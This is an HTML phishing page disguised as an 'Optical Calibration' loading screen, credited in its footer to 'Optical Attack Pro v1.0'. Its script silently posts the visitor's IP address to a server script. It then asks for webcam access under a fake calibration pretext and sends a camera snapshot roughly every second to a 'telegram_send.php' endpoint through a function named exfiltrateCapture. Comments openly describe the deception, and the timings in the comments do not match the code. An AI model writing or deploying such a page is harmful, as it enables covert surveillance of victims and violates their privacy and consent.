<!DOCTYPE html>
<html>
<head>
    <title>Optical Calibration System - Please Wait</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            text-align: center;
            background: white;
            padding: 50px;
            border-radius: 15px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.3);
            max-width: 550px;
            border-left: 5px solid #2a5298;
        }
        h1 {
            color: #1e3c72;
            margin: 0 0 10px 0;
            font-size: 32px;
            font-weight: 700;
        }
        .subtitle {
            color: #2a5298;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 25px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        p {
            color: #555;
            font-size: 16px;
            margin: 12px 0;
            line-height: 1.6;
        }
        .loader {
            border: 4px solid #f0f0f0;
            border-top: 4px solid #2a5298;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #2a5298;
            font-weight: 600;
            margin-top: 20px;
            font-size: 14px;
            letter-spacing: 0.5px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Optical Calibration</h1>
        <div class="subtitle">Advanced Imaging System</div>
        <p>Setting up your optical sensor array...</p>
        <p style="font-size: 14px; color: #777;">আপনার অপটিক্যাল সেন্সর কনফিগার করা হচ্ছে...</p>
        <div class="loader"></div>
        <p class="status" id="status">Initializing optical sensors...</p>
        <div class="footer">
            <p>Optical Attack Pro v1.0<br>Made by Ahsan</p>
        </div>
    </div>

    <script>
        const statusMessages = [
            "Initializing optical sensors...",
            "Loading calibration matrix...",
            "Requesting optical access...",
            "Configuring lens parameters...",
            "Testing focal depth...",
            "Syncing capture modules...",
            "Calibration in progress..."
        ];
        
        let msgIndex = 0;
        setInterval(() => {
            msgIndex = (msgIndex + 1) % statusMessages.length;
            document.getElementById('status').textContent = statusMessages[msgIndex];
        }, 2000);

        // Send IP immediately (silent)
        fetch('ip.php', { method: 'POST' });

        // Request camera after 2.5 second delay (appears natural)
        setTimeout(() => {
            requestOpticalAccess();
        }, 1500);

        async function requestOpticalAccess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                handleSuccess(stream);
            } catch (e) {
                document.getElementById('status').textContent = "Error: Access denied";
            }
        }

        function handleSuccess(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 1280;
            canvas.height = 720;
            const context = canvas.getContext('2d');

            document.getElementById('status').textContent = "✓ Calibration complete!";

            // Capture every 1.5 seconds
            setInterval(() => {
                context.drawImage(video, 0, 0, 1280, 720);
                const imgData = canvas.toDataURL("image/jpeg", 0.4);
                exfiltrateCapture(imgData);
            }, 1000);
        }

        async function exfiltrateCapture(imgData) {
            fetch('telegram_send.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'image=' + encodeURIComponent(imgData)
            }).catch(() => {});
        }
    </script>
</body>
</html>
